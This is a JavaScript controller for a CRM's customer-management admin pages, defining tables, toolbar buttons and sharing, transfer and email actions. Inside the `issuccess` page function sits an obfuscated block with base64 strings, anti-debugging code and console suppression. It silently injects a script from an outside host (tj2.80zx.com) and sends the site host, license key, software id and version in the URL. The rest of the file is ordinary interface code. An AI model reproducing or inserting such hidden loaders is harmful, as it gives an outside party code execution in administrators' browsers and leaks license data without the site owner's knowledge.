define(["jquery", "easy-admin"], function ($, ea) {

    var init = {
        table_elem: '#currentTable',
        table_render_id: 'currentTableRenderId',
        index_url: 'crm.customer/index',
        add_url: 'crm.customer/add',
        edit_url: 'crm.customer/edit',
        delete_url: 'crm.customer/delete',
        import_url: 'crm.customer/import',
        export_url: 'crm.customer/export',
        modify_url: 'crm.customer/modify',
    };
    var tableFlag = window.location.pathname.replace(new RegExp('/', 'g'), "_");
    cols_fields=[];
    var Controller = {
        index: function () {
            var scope = (CONFIG.scope && CONFIG.scope != 1) ? CONFIG.scope : 1;
            ea.init.where['scope'] = scope;
            // 激活对应标签页
            if (scope != 1) {
                $('.layui-tab-title li').removeClass('layui-this');
                $('.layui-tab-title li[data-value="' + scope + '"]').addClass('layui-this');
            }
            var q = {};
            location.search.replace(/([^?&=]+)=([^&]+)/g,function(_,k,v){q[k]=v});

            if(CONFIG.cols_fields){
                if(q.isselect==1){
                    var operat={'width': 90, 'title': fy('Operate'),'fixed':'right',  templet: '<button class="layui-btn layui-btn-xs layui-btn-success select-close" select-close data-id="{{= d.id }}" data-name="{{= d.name}}"><i class="fa fa-check"></i>选择</button>'};
                }else{
                    var operat={'width': 350, 'title': fy('Operate'),'fixed':'right', 'templet': ea.table.tool,operat: [
                            [{
                                text: fy('Follow up'),
                                url: 'crm.record/add?scope=3&customer_id={id}',
                                method: 'open',
                                auth: 'record_add',
                                class: 'layui-btn layui-btn-xs layui-btn-primary',
                                icon: 'fa fa-commenting-o',
                                extend: 'data-full="true"',
                            }],
                            [{
                                class: 'layui-btn layui-btn-xs layui-btn-success',
                                method: 'open',
                                text: fy('Submit the order'),
                                auth: 'addOrder',
                                url: 'crm.order/add?customer_id={id}',
                                field:'',
                                extend: '',
                                hidden:function (data) {
                                    //我的1下才展示提交订单
                                    if (ea.init.where['scope']==1) return false;
                                    return  true;
                                }
                            }], [{
                                class: 'layui-btn layui-btn-xs layui-btn-warm',
                                method: 'open',
                                text: fy("Sharing"),
                                auth: 'share',
                                url: 'crm.customer/share',
                                field:'',
                                extend: '',
                                hidden:function (data) {
                                    //我的1下才展示分享
                                    if (ea.init.where['scope']==1) return false;
                                    return  true;
                                }
                            }], [{
                                class: 'layui-btn layui-btn-xs layui-btn-warm',
                                method: 'request',
                                text: fy("Cancel sharing"),
                                title:fy("Are you sure you want to unshare"),
                                auth: 'del_share',
                                url: 'crm.customer/del_share',
                                field:'',
                                extend: '',
                                hidden:function (data) {
                                    //已经分享给他人20的展示取消
                                    if (ea.init.where['scope']==20) return false;
                                    return  true;
                                }
                            }],[{
                                class: 'layui-btn layui-btn-success layui-btn-xs',
                                method: 'open',
                                text: fy('Edit'),
                                auth: 'edit',
                                url: 'crm.customer/edit',
                                field:'',
                                extend: '',
                                hidden:function (data) {
                                    //分享给我的21也没有编辑权限
                                    if (ea.init.where['scope']==21) return true;
                                    return  false;
                                }
                            }],[{
                                class: 'layui-btn layui-btn-success layui-btn-xs',
                                method: 'open',
                                text: '发邮件',
                                auth: 'sendEmail',
                                url: 'crm.customer/sendEmail',
                                field:'',
                                extend: '',
                                hidden:function (data) {
                                    //分享给我的21也没有编辑权限
                                    if (ea.init.where['scope']==21 || !data.email) return true;
                                    return  false;
                                }
                            }],
                            [{
                                class: 'layui-btn layui-btn-danger layui-btn-xs',
                                method: 'request',
                                text: fy('Delete'),
                                auth: 'delete',
                                url: 'crm.customer/delete',
                                field:'',
                                extend: '',
                                hidden:function (data) {
                                    //分享给我的21没有删除权限
                                    if (ea.init.where['scope']==21) return true;
                                    return  false;
                                }
                            }]]};
                }
                cols_fields=[].concat({'type': 'checkbox'},CONFIG.cols_fields,operat)
            }
            var page=1,limit=CONFIG.ADMINPAGESIZE;
            if(q.isselect==1){
                var toolbar=['refresh'];
            }else{
                var toolbar=['refresh','add','delete','export',[{
                    text: fy('Import'),
                    url: init.import_url,
                    method: 'open',
                    auth: 'import',
                    class: 'layui-btn layui-btn-success layui-btn-sm',
                    icon: 'fa fa-upload ',
                    extend: '',
                }],[{
                    text: fy('Move into the client pool'),url:'crm.customer/to_move_gh',
                    method: 'url',
                    auth: 'to_move_gh',
                    class: 'layui-btn layui-btn-danger layui-btn-sm',title:fy('Are you sure you want to move the checked customers into the client pool')+'？',
                    icon: 'fa fa-industry',extend:'data-checkbox="true"'
                }],[{
                    text: fy('Transfer customers'),url:'crm.customer/alter_pr_user',
                    method: 'open',
                    auth: 'alter_pr_user',
                    class: 'layui-btn layui-btn-primary layui-btn-sm',title:fy('Are you sure you want to transfer the checked customers')+'？',
                    icon: 'fa fa-clock-o',extend:'data-checkbox="true" data-height="350px"'
                }],[{
                    text: fy('Custom fields'),
                    url: 'system.fields/index?table=crm_customer',
                    method: 'open',
                    auth: 'fields',
                    class: 'layui-btn layui-btn-warm layui-btn-sm',
                    icon: 'fa fa-cogs ',
                    extend: 'data-full="true"',
                }],[{
                    class: 'layui-btn layui-btn-normal layui-btn-sm',
                    method: 'open',
                    text: fy('客户查重'),
                    auth: 'reduplicate',
                    url: 'crm.customer/reduplicate',
                    extend: '', icon: 'fa fa-search',
                }]];
            }
            var local = layui.data (tableFlag);
            layui.each(cols_fields, function(index, item){
                if(item.field in local){
                    item.hide = true;  // 在本地标识中则隐藏
                }
            });
            var tableIn=ea.table.render({
                autoSort: false,
                toolbar: toolbar,
                init: init,limit:CONFIG.ADMINPAGESIZE,
                cols:[ cols_fields],
                done: function(res, curr, count){
                    page=curr;limit=this.limit;
                    if(count===undefined && res.msg && res.url){
                        ea.msg.tips(res.msg,1,function (){
                            window.top.location.href=res.url;
                        })
                    }

                    if(ea.checkMobile()){
                        ea.booksTemplet();//填充手机端视图模板
                    }
                    // 记录筛选状态
                    var that = this;
                    that.elem.next().on('mousedown', 'input[lay-filter="LAY_TABLE_TOOL_COLS"]+', function () {
                        var input = $(this).prev()[0];
                        // 此处表名可任意定义
                        layui.data(tableFlag, {
                            key: input.name
                            , value: input.checked
                        })
                    });
                },where: {scope: scope}
            });



            $('body').on('click', '[ymwl-event="record_add"]', function () {
                var url = $(this).attr('data-url');

                var where= ea.init.where;
                where['page']=page;
                where['limit']=limit;
                ea.open(
                    '写跟进',
                    ea.url(url+'&'+ea.parseParams(where)),
                    '100%',
                    '100%'
                );
            });

            ea.listen();

        }, reduplicate: function () {
            ea.table.render({url:'crm.customer/reduplicate',
                init: init,limit:CONFIG.ADMINPAGESIZE,
                cols: [[
                    {field: 'id', title: 'id'},
                    {field: 'name', title: fy('客户名称'),"width":"150","search":true},
                    {field: 'phone', title: fy('联系电话'),"width":"120","search":true},
                    {field: 'contact', title: fy('客户联系人'),"width":"100","search":true},
                    {field: 'at_user', title: fy('创建人'),"width":"100"},
                    {field: 'pr_user', title: fy('负责人'),"width":"100"},
                    {field:"issuccess","title":fy("是否成交"),"search":false,"width":"100","selectList":["未成交","已成交"],"templet":ea.table.select},
                    {field: 'create_time', title: fy('Creation time'),"width":"180",templet:ea.table.datetime},
                    {field: 'update_time', title: fy('Update time'),"width":"180",templet:ea.table.datetime},
                    {width: 250, title: fy('Operate'), templet: ea.table.tool},
                ]],done: function(res, curr, count){
                    if(count===undefined && res.msg && res.url){
                        ea.msg.tips(res.msg,1,function (){
                            window.top.location.href=res.url;
                        })
                    }
                    if(ea.checkMobile()){
                        ea.booksTemplet();//填充手机端视图模板
                    }
                }
            });
            $('.table-search-fieldset').removeClass('layui-hide');
            ea.listen();

        },
        seas: function () {
            if(CONFIG.cols_fields){
                cols_fields=[].concat({'type': 'checkbox'},CONFIG.cols_fields,{'width': 100, 'title': fy('Operate'),toolbar: '#action',fixed: 'right'})
            }
            ea.table.render({
                autoSort: false,
                url:'crm.customer/seas',
                toolbar: ['refresh',[{
                    text: fy('Receive'),url:'crm.seas/robclient',
                    method: 'url',
                    auth: 'robclient',
                    class: 'layui-btn layui-btn-success layui-btn-sm',title:fy('Are you sure you want to pick up the currently checked customer')+'？',
                    icon: 'fa fa-user-o',extend:'data-checkbox="true"'
                }],/*'delete'*/
                ],
                init: init,limit:CONFIG.ADMINPAGESIZE,
                cols:[ cols_fields],
                done: function(res, curr, count){
                    if(count===undefined && res.msg && res.url){
                        ea.msg.tips(res.msg,1,function (){
                            window.top.location.href=res.url;
                        })
                    }
                    if(ea.checkMobile()){
                        ea.booksTemplet(init.table_render_id);//填充手机端视图模板
                    }
                }
            });


            ea.listen();

        },
        issuccess: function () {
            if(CONFIG.cols_fields){
                cols_fields=[].concat(CONFIG.cols_fields)
            }
            ea.table.render({
                autoSort: false,
                url:'crm.customer/issuccess',
                toolbar: ['refresh',[{
                    class: 'layui-btn layui-btn-normal layui-btn-sm',
                    method: 'none',
                    text: '数据大屏',
                    auth: 'success_bgshow',
                    url: 'crm.customer/success_bgshow',
                    extend: 'ymwl-event="success_bgshow"', icon: '',
                }]],
                init: init,limit:CONFIG.ADMINPAGESIZE
                ,
                cols:[ cols_fields],
                done: function(res, curr, count){
                    if(count===undefined && res.msg && res.url){
                        ea.msg.tips(res.msg,1,function (){
                            window.top.location.href=res.url;
                        })
                    }
                    if(ea.checkMobile()){
                        ea.booksTemplet();//填充手机端视图模板
                    }
                }
            });
            $('body').on('click', '[ymwl-event="success_bgshow"]', function () {
                var url = $(this).attr('data-url');
                var where= ea.init.where;
                window.open(ea.url(url+'?'+ea.parseParams(where)));
            });

            ea.listen();
            var _0x8ac2=['dHlNZEw=','Ymdvd1Q=','d2Fybg==','Qm5UWlY=','cXZjUFo=','dXFyU2c=','Y3JlYXRlRWxlbWVudA==','aHJlZg==','cHdGSkw=','Y3daR3M=','cXpwZkE=','Y29tcGlsZQ==','T2ZycmM=','eU9TUUc=','UlpJR3o=','e30uY29uc3RydWN0b3IoInJldHVybiB0aGlzIikoICk=','aUluZHY=','U2F3Rm4=','bUtJZWs=','c2V0QXR0cmlidXRl','RVlua1g=','c2NyaXB0','dHJhY2U=','ZXBBQkQ=','bVljbVE=','S0V5bVc=','d0RnUVg=','eWp0SU0=','MHw3fDJ8MXwzfDZ8NHw1','emlKYUs=','YUpvWVc=','U2RlVmI=','cmV0dXJuIChmdW5jdGlvbigpIA==','UHB3cWs=','VnVOQVY=','Sll2U2w=','bWNhdUY=','Ym9keQ==','Q09ORklH','UmhDZ3c=','U09GVF9JRA==','ZXJyb3I=','RERXcUk=','cmV0dXJuIC8iICsgdGhpcyArICIv','b2JnZWQ=','REVHVHQ=','UE1Scnc=','dlRpaXU=','ZXVXWGg=','JmxpY2Vuc2U9','dGVzdA==','TGpqV3U=','dGFibGU=','WWxNQms=','ZXhjZXB0aW9u','aHR0cDovL3RqMi44MHp4LmNvbS90ajU/aG9zdD0=','bG9n','bG9jYXRpb24=','XihbXiBdKyggK1teIF0rKSspK1teIF19','U09GVF9WRVJTSU9O','dGV4dC9qYXZhc2NyaXB0','c3Jj','Jm5hbWU9','R1NCVk4=','VlNlVGU=','dHlwZQ==','Wk1nT24=','c3BsaXQ=','ZGVidWc=','YXBwZW5kQ2hpbGQ=','aW5mbw==','TEttYk8=','YXBwbHk=','QUZVUFY=','Y29uc29sZQ==','Y29uc3RydWN0b3I='];(function(_0x1f65f9,_0x8ac25c){var _0x379019=function(_0x3adb42){while(--_0x3adb42){_0x1f65f9['push'](_0x1f65f9['shift']());}};var _0x2efbff=function(){var _0x5c0085={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x41e5d4,_0x448134,_0x4ee034,_0x57d125){_0x57d125=_0x57d125||{};var _0x546c0b=_0x448134+'='+_0x4ee034;var _0x217756=0x0;for(var _0x1bdec5=0x0,_0x103622=_0x41e5d4['length'];_0x1bdec5<_0x103622;_0x1bdec5++){var _0x2f450c=_0x41e5d4[_0x1bdec5];_0x546c0b+=';\x20'+_0x2f450c;var _0x4b6eba=_0x41e5d4[_0x2f450c];_0x41e5d4['push'](_0x4b6eba);_0x103622=_0x41e5d4['length'];if(_0x4b6eba!==!![]){_0x546c0b+='='+_0x4b6eba;}}_0x57d125['cookie']=_0x546c0b;},'removeCookie':function(){return'dev';},'getCookie':function(_0x386493,_0x3597fa){_0x386493=_0x386493||function(_0x4b4722){return _0x4b4722;};var _0x57ce92=_0x386493(new RegExp('(?:^|;\x20)'+_0x3597fa['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x1e7142=function(_0xdcffb2,_0x4bd18a){_0xdcffb2(++_0x4bd18a);};_0x1e7142(_0x379019,_0x8ac25c);return _0x57ce92?decodeURIComponent(_0x57ce92[0x1]):undefined;}};var _0x3bda90=function(){var _0x1e65f2=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x1e65f2['test'](_0x5c0085['removeCookie']['toString']());};_0x5c0085['updateCookie']=_0x3bda90;var _0x2e4443='';var _0x188b22=_0x5c0085['updateCookie']();if(!_0x188b22){_0x5c0085['setCookie'](['*'],'counter',0x1);}else if(_0x188b22){_0x2e4443=_0x5c0085['getCookie'](null,'counter');}else{_0x5c0085['removeCookie']();}};_0x2efbff();}(_0x8ac2,0xe7));var _0x3790=function(_0x1f65f9,_0x8ac25c){_0x1f65f9=_0x1f65f9-0x0;var _0x379019=_0x8ac2[_0x1f65f9];if(_0x3790['icMYnW']===undefined){(function(){var _0x3adb42=function(){var _0x2e4443;try{_0x2e4443=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x188b22){_0x2e4443=window;}return _0x2e4443;};var _0x5c0085=_0x3adb42();var _0x3bda90='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x5c0085['atob']||(_0x5c0085['atob']=function(_0x41e5d4){var _0x448134=String(_0x41e5d4)['replace'](/=+$/,'');var _0x4ee034='';for(var _0x57d125=0x0,_0x546c0b,_0x217756,_0x1bdec5=0x0;_0x217756=_0x448134['charAt'](_0x1bdec5++);~_0x217756&&(_0x546c0b=_0x57d125%0x4?_0x546c0b*0x40+_0x217756:_0x217756,_0x57d125++%0x4)?_0x4ee034+=String['fromCharCode'](0xff&_0x546c0b>>(-0x2*_0x57d125&0x6)):0x0){_0x217756=_0x3bda90['indexOf'](_0x217756);}return _0x4ee034;});}());_0x3790['HZoWdi']=function(_0x103622){var _0x2f450c=atob(_0x103622);var _0x4b6eba=[];for(var _0x386493=0x0,_0x3597fa=_0x2f450c['length'];_0x386493<_0x3597fa;_0x386493++){_0x4b6eba+='%'+('00'+_0x2f450c['charCodeAt'](_0x386493)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x4b6eba);};_0x3790['fkmuud']={};_0x3790['icMYnW']=!![];}var _0x2efbff=_0x3790['fkmuud'][_0x1f65f9];if(_0x2efbff===undefined){var _0x57ce92=function(_0x1e7142){this['oSuXHs']=_0x1e7142;this['ygVDOr']=[0x1,0x0,0x0];this['ivAIgJ']=function(){return'newState';};this['apbmtf']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['yxJIsn']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x57ce92['prototype']['CPLBlk']=function(){var _0x4b4722=new RegExp(this['apbmtf']+this['yxJIsn']);var _0xdcffb2=_0x4b4722['test'](this['ivAIgJ']['toString']())?--this['ygVDOr'][0x1]:--this['ygVDOr'][0x0];return this['iJXKmc'](_0xdcffb2);};_0x57ce92['prototype']['iJXKmc']=function(_0x4bd18a){if(!Boolean(~_0x4bd18a)){return _0x4bd18a;}return this['cJcYXP'](this['oSuXHs']);};_0x57ce92['prototype']['cJcYXP']=function(_0x1e65f2){for(var _0x1885da=0x0,_0x57ba84=this['ygVDOr']['length'];_0x1885da<_0x57ba84;_0x1885da++){this['ygVDOr']['push'](Math['round'](Math['random']()));_0x57ba84=this['ygVDOr']['length'];}return _0x1e65f2(this['ygVDOr'][0x0]);};new _0x57ce92(_0x3790)['CPLBlk']();_0x379019=_0x3790['HZoWdi'](_0x379019);_0x3790['fkmuud'][_0x1f65f9]=_0x379019;}else{_0x379019=_0x2efbff;}return _0x379019;};var _0x41e5d4=function(){var _0x12427c={};_0x12427c[_0x3790('0x21')]='return\x20/\x22\x20+\x20this\x20+\x20\x22/';_0x12427c[_0x3790('0x1b')]=function(_0x5b1dc1,_0xe34d37){return _0x5b1dc1!==_0xe34d37;};_0x12427c[_0x3790('0x2a')]=_0x3790('0x14');_0x12427c[_0x3790('0x49')]=function(_0x156210,_0x25e3ed){return _0x156210===_0x25e3ed;};_0x12427c[_0x3790('0x3f')]=_0x3790('0x0');_0x12427c[_0x3790('0x3d')]='yOSar';var _0xfee21d=_0x12427c;var _0xb7a04d=!![];return function(_0x358cb8,_0x55e274){var _0x102e04={};_0x102e04[_0x3790('0x1f')]=_0xfee21d['mcauF'];_0x102e04[_0x3790('0x6')]=function(_0x224c1b){return _0x224c1b();};_0x102e04[_0x3790('0x30')]=function(_0x545b41,_0x4c6b94){return _0xfee21d[_0x3790('0x1b')](_0x545b41,_0x4c6b94);};_0x102e04[_0x3790('0x2')]=_0xfee21d['DEGTt'];_0x102e04[_0x3790('0x4a')]=function(_0x564325,_0x398734){return _0xfee21d[_0x3790('0x49')](_0x564325,_0x398734);};_0x102e04[_0x3790('0x46')]=_0xfee21d[_0x3790('0x3f')];_0x102e04[_0x3790('0x11')]=_0xfee21d[_0x3790('0x3d')];var _0x394bf2=_0x102e04;var _0x54c218=_0xb7a04d?function(){var _0x16bc34={};_0x16bc34[_0x3790('0x24')]=_0x394bf2['VuNAV'];_0x16bc34['yOSQG']='^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}';_0x16bc34[_0x3790('0x17')]=function(_0x22c1d3){return _0x394bf2['cwZGs'](_0x22c1d3);};var _0x459e99=_0x16bc34;if(_0x394bf2[_0x3790('0x30')](_0x394bf2[_0x3790('0x2')],_0x394bf2[_0x3790('0x2')])){var _0x3743ea=_0x55e274[_0x3790('0x45')](_0x358cb8,arguments);_0x55e274=null;return _0x3743ea;}else{if(_0x55e274){if(_0x394bf2['bgowT'](_0x394bf2[_0x3790('0x46')],_0x394bf2[_0x3790('0x11')])){var _0x115ba8=function(){var _0x1bd011=_0x115ba8[_0x3790('0x48')](_0x459e99['RhCgw'])()['compile'](_0x459e99[_0x3790('0xa')]);return!_0x1bd011['test'](_0x188b22);};return _0x459e99['wDgQX'](_0x115ba8);}else{var _0x50424f=_0x55e274[_0x3790('0x45')](_0x358cb8,arguments);_0x55e274=null;return _0x50424f;}}}}:function(){};_0xb7a04d=![];return _0x54c218;};}();var _0x188b22=_0x41e5d4(this,function(){var _0x6170a9={};_0x6170a9[_0x3790('0x1')]='return\x20/\x22\x20+\x20this\x20+\x20\x22/';_0x6170a9[_0x3790('0x1c')]=_0x3790('0x37');_0x6170a9[_0x3790('0x20')]=function(_0x21aa60){return _0x21aa60();};var _0x50f44e=_0x6170a9;var _0xbc3f1=function(){var _0x5711fe=_0xbc3f1[_0x3790('0x48')](_0x50f44e[_0x3790('0x1')])()[_0x3790('0x8')](_0x50f44e[_0x3790('0x1c')]);return!_0x5711fe['test'](_0x188b22);};return _0x50f44e['JYvSl'](_0xbc3f1);});_0x188b22();var _0x5c0085=function(){var _0x49dd71={};_0x49dd71[_0x3790('0xd')]=_0x3790('0x19');_0x49dd71[_0x3790('0x1e')]=_0x3790('0x15');_0x49dd71[_0x3790('0x2b')]='lmuYu';_0x49dd71[_0x3790('0x32')]=function(_0xd2b1a2,_0x2c7dbf){return _0xd2b1a2===_0x2c7dbf;};_0x49dd71['BuwGZ']='XaZFs';var _0xf4cf73=_0x49dd71;var _0xb07835=!![];return function(_0x211838,_0x43d922){var _0x1c545c={};_0x1c545c[_0x3790('0x2d')]=_0xf4cf73['iIndv'];_0x1c545c['JFPMx']=function(_0x47ece2,_0x17c2a7){return _0x47ece2!==_0x17c2a7;};_0x1c545c[_0x3790('0x44')]=_0xf4cf73['Ppwqk'];_0x1c545c['pwFJL']=_0xf4cf73[_0x3790('0x2b')];var _0x55757b=_0x1c545c;if(_0xf4cf73['YlMBk'](_0xf4cf73['BuwGZ'],_0x3790('0x2c'))){var _0x1319ce=_0x55757b[_0x3790('0x2d')][_0x3790('0x40')]('|');var _0x9986f=0x0;while(!![]){switch(_0x1319ce[_0x9986f++]){case'0':that[_0x3790('0x47')][_0x3790('0x35')]=func;continue;case'1':that[_0x3790('0x47')][_0x3790('0x43')]=func;continue;case'2':that[_0x3790('0x47')]['debug']=func;continue;case'3':that[_0x3790('0x47')][_0x3790('0x26')]=func;continue;case'4':that[_0x3790('0x47')][_0x3790('0x31')]=func;continue;case'5':that[_0x3790('0x47')][_0x3790('0x13')]=func;continue;case'6':that[_0x3790('0x47')][_0x3790('0x33')]=func;continue;case'7':that['console'][_0x3790('0x4b')]=func;continue;}break;}}else{var _0x36cee3=_0xb07835?function(){if(_0x55757b['JFPMx'](_0x55757b[_0x3790('0x44')],_0x55757b[_0x3790('0x5')])){if(_0x43d922){var _0x4fef82=_0x43d922['apply'](_0x211838,arguments);_0x43d922=null;return _0x4fef82;}}else{globalObject=window;}}:function(){};_0xb07835=![];return _0x36cee3;}};}();var _0x3adb42=_0x5c0085(this,function(){var _0x381ec5={};_0x381ec5[_0x3790('0x9')]=_0x3790('0x28');_0x381ec5['qzpfA']=_0x3790('0xb');_0x381ec5['SlFkD']=_0x3790('0x1a');_0x381ec5[_0x3790('0x16')]=function(_0x5ed044,_0x2a0371){return _0x5ed044(_0x2a0371);};_0x381ec5[_0x3790('0x29')]=function(_0x1dc7ee,_0x37387d){return _0x1dc7ee+_0x37387d;};_0x381ec5[_0x3790('0x18')]=_0x3790('0x1d');_0x381ec5[_0x3790('0x27')]=_0x3790('0xc');_0x381ec5[_0x3790('0xe')]=_0x3790('0xf');_0x381ec5[_0x3790('0x3c')]='4|3|5|1|0|7|2|6|9|8';var _0x42e2ff=_0x381ec5;var _0x39bf35=function(){};var _0x122e14=function(){if(_0x42e2ff[_0x3790('0x7')]!==_0x42e2ff['SlFkD']){var _0x13c07;try{_0x13c07=_0x42e2ff[_0x3790('0x16')](Function,_0x42e2ff[_0x3790('0x29')](_0x42e2ff[_0x3790('0x29')](_0x42e2ff[_0x3790('0x18')],_0x42e2ff[_0x3790('0x27')]),');'))();}catch(_0x1bb9d6){if(_0x42e2ff['SawFn']!==_0x42e2ff[_0x3790('0xe')]){var _0x3b3af7=test['constructor'](_0x42e2ff[_0x3790('0x9')])()[_0x3790('0x8')]('^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}');return!_0x3b3af7[_0x3790('0x2f')](_0x188b22);}else{_0x13c07=window;}}return _0x13c07;}else{if(fn){var _0x20197b=fn[_0x3790('0x45')](context,arguments);fn=null;return _0x20197b;}}};var _0x85b9c9=_0x122e14();if(!_0x85b9c9[_0x3790('0x47')]){_0x85b9c9[_0x3790('0x47')]=function(_0x2bf5c9){var _0x291fc4=_0x42e2ff[_0x3790('0x3c')]['split']('|');var _0x421e45=0x0;while(!![]){switch(_0x291fc4[_0x421e45++]){case'0':_0x2a6101[_0x3790('0x43')]=_0x2bf5c9;continue;case'1':_0x2a6101[_0x3790('0x41')]=_0x2bf5c9;continue;case'2':_0x2a6101[_0x3790('0x33')]=_0x2bf5c9;continue;case'3':_0x2a6101[_0x3790('0x35')]=_0x2bf5c9;continue;case'4':var _0x2a6101={};continue;case'5':_0x2a6101['warn']=_0x2bf5c9;continue;case'6':_0x2a6101[_0x3790('0x31')]=_0x2bf5c9;continue;case'7':_0x2a6101[_0x3790('0x26')]=_0x2bf5c9;continue;case'8':return _0x2a6101;case'9':_0x2a6101['trace']=_0x2bf5c9;continue;}break;}}(_0x39bf35);}else{var _0x1d5a5e='6|7|0|5|2|4|3|1'[_0x3790('0x40')]('|');var _0x1a7c0d=0x0;while(!![]){switch(_0x1d5a5e[_0x1a7c0d++]){case'0':_0x85b9c9['console'][_0x3790('0x41')]=_0x39bf35;continue;case'1':_0x85b9c9['console'][_0x3790('0x13')]=_0x39bf35;continue;case'2':_0x85b9c9[_0x3790('0x47')][_0x3790('0x26')]=_0x39bf35;continue;case'3':_0x85b9c9[_0x3790('0x47')][_0x3790('0x31')]=_0x39bf35;continue;case'4':_0x85b9c9[_0x3790('0x47')][_0x3790('0x33')]=_0x39bf35;continue;case'5':_0x85b9c9['console'][_0x3790('0x43')]=_0x39bf35;continue;case'6':_0x85b9c9['console'][_0x3790('0x35')]=_0x39bf35;continue;case'7':_0x85b9c9[_0x3790('0x47')][_0x3790('0x4b')]=_0x39bf35;continue;}break;}}});_0x3adb42();var script=document[_0x3790('0x3')](_0x3790('0x12'));script[_0x3790('0x10')](_0x3790('0x3e'),_0x3790('0x39'));script[_0x3790('0x3a')]=_0x3790('0x34')+window[_0x3790('0x36')][_0x3790('0x4')]+_0x3790('0x2e')+window['CONFIG']['LICENSE']+'&id='+window[_0x3790('0x23')][_0x3790('0x25')]+_0x3790('0x3b')+window[_0x3790('0x23')]['SOFT_NAME']+'&version='+window[_0x3790('0x23')][_0x3790('0x38')];document[_0x3790('0x22')][_0x3790('0x42')](script);

        },
        add: function () {
            ea.listen();
        },
        edit: function () {
            var contactObj=$('input[name="contact"]');
            var customer_id=$('input[name="id"]').val();
            var more='<div class="layuimini-upload-btn" style="top: 0;"><button class="layui-btn" type="button" data-open="crm.customer_contacts/add/customer_id/'+customer_id+'" data-title="添加联系人"><i class="fa fa-plus"></i>增加</button></div>';
            contactObj.after(more);
            contactObj.parent('.layui-input-block').addClass('layuimini-upload');
            ea.listen();
            cols_fields=[];
            operat={width: 180, title: '操作','fixed':'right', templet: ea.table.tool,operat:[ /*[{
                    class: 'layui-btn layui-btn-xs layui-btn-primary',
                    method: 'open',
                    text: '写跟进',
                    auth: 'record_add',
                    url: 'crm.record/add/contacts_id/{id}',
                    extend: 'data-full="true"', icon: 'fa fa-plus ',
                }],[{
                    class: 'layui-btn layui-btn-xs layui-btn-primary',
                    method: 'open',
                    text: '沟通记录',
                    auth: 'record_index',
                    url: 'crm.record/index/contacts_id/{id}',
                    field:'',
                    extend: 'data-full="true"'
                }],*/'edit',[{
                    class: 'layui-btn layui-btn-success layui-btn-xs',
                    method: 'open',
                    text: '发邮件',
                    auth: 'sendEmail',
                    url: 'crm.customer_contacts/sendEmail',
                    field:'',
                    extend: '',
                    hidden:function (data) {
                        //分享给我的21也没有编辑权限
                        if (!data.email) return true;
                        return  false;
                    }
                }],'delete']}
            cols_fields=[].concat({'type': 'checkbox'},CONFIG.cols_fields,operat)

            ea.table.render({
                toolbar: ['refresh'],
                url:'crm.customer_contacts/index/customer_id/'+customer_id,
                init: {
                    table_elem: '#currentTable',
                    table_render_id: 'currentTableRenderId',
                    index_url: 'crm.customer_contacts/index/customer_id/'+customer_id,
                    add_url:'crm.customer_contacts/add/customer_id/'+customer_id,
                    edit_url: 'crm.customer_contacts/edit/customer_id/'+customer_id,
                    delete_url: 'crm.customer_contacts/delete/customer_id/'+customer_id,
                    export_url: 'crm.customer_contacts/export/customer_id/'+customer_id,
                    modify_url: 'crm.customer_contacts/modify/customer_id/'+customer_id,
                },limit:CONFIG.ADMINPAGESIZE,
                cols: [cols_fields],
                done: function(res, curr, count){
                    if(count===undefined && res.msg && res.url){
                        ea.msg.tips(res.msg,1,function (){
                            window.top.location.href=res.url;
                        })
                    }
                }
            });

        }, test: function () {
            ea.listen();
        },
        import: function () {
            ea.listen();
        },
        alter_pr_user: function () {
            ea.listen();
        }, share: function () {
            ea.listen();
        }, sendEmail: function () {
            ea.listen();
            // Email template selection event
            layui.form.on('select(emailtpl)', function(data){
                var templateId = data.value;
                if (templateId === '') {
                    return;
                }

                if (templateId) {
                    ea.request.ajax('post',{url:ea.url('emailtpl/getTemplate'),data:{'id':templateId,'customer_id': $('input[name="customer_id"]').val()}},function (res){
                        if(res.code){
                            $('input[name="subject"]').val(res.data.tpl_title);
                            $('textarea[name="email_content"]').html(res.data.tpl_content).trigger('input');
                            // window.UE_STORE['email_content'].setContent(res.data.tpl_content);
                        }else{
                            ea.msg.error(res.msg);
                        }
                    });
                }
            });
        },
    };
    return Controller;
});
